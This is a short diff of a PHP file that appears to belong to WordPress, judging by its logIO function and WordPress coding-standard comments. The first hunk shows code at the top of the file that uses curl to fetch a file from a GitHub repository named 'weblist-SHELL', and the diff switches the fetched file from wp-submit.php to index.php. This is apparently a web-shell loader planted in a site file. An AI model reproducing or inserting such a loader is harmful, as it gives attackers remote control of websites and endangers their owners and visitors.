@@ -1,5 +1,5 @@
 <?php
-$url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/wp-submit.php";
+$url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/index.php";
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_HEADER, true);
@@ -124,4 +124,5 @@ function logIO( $io, $msg ) { // phpcs:ignore WordPress.NamingConventions.ValidF
 		error_log( $io . ' - ' . $msg );
 	}
 }
+
 
